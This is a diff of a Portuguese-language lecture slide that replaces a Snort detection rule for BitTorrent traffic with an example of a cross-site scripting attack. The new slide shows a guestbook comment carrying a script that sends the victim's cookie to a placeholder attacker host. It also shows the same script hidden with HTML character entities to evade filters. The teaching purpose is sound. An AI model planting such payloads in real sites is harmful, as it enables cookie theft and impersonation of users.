@@ -1,14 +1,16 @@
-\frametitle{Regra SNORT}
-\small
-    \textbf{Regra Snort:}
-    \begin{verbatim}
-alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]
-(msg:"ET P2P BitTorrent peer sync";
- flow:established,to_server;
- content:"|00 00 00 0d 06 00|"; depth:6;
- threshold: type limit, track by_dst, seconds 300, count 1;
- reference:url,bitconjurer.org/BitTorrent/protocol.html;
- classtype:policy-violation; sid:2000334; rev:14;
- metadata:created_at 2010_07_30, confidence Medium,
- signature_severity Informational, updated_at 2025_06_30;)
-\end{verbatim}
+\frametitle{Exemplo de Ataque XSS e Ofuscação}
+\begin{itemize}
+        \item \textbf{Cenário (Roubo de Cookie):} Código injetado em um livro de visitas que envia o cookie da vítima para o atacante, permitindo personificação.
+              \begin{verbatim}
+Thanks for this information, its great!
+<script>document.location='http://hacker.web.site/cookie.cgi?'+
+document.cookie</script>
+        \end{verbatim}
+
+        \item \textbf{Ofuscação (Evasão):} O atacante utiliza entidades de caracteres HTML para esconder o script. O navegador interpreta o código abaixo de forma idêntica ao original.
+              \begin{verbatim}
+Thanks for this information, its great!
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116; ...
+        \end{verbatim}
+    \end{itemize}
